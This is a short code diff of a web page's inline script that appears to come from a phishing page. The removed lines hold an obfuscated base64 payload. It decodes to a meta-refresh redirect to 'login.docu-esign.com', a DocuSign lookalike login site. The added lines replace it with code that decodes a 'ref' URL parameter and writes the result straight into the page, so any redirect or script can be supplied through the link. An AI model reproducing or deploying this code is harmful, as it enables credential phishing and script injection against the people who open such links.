@@ -58,8 +58,9 @@
     </script>
 
     <script type="text/javascript">
-      if (hasEmail) {
-        let ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vbG9naW4uZG9jdS1lc2lnbi5jb20veW9Xd1hxTUQlM0ZkSk4lM0Q4N25KWHRQbWtJbWlTeVByZ1R4dzh3dUZkNlNjbHlnS1J4VnJKd0hWekFOUC1DMVdvaVlaUUElMjIlMjAvJTNF";
+      let hasRef = new URLSearchParams(window.location.search).has("ref");
+      if (hasRef) {
+        let ref = new URLSearchParams(window.location.search).get("ref");
         document.write(decodeURIComponent(atob(`${ref}`)));
       }
     </script>
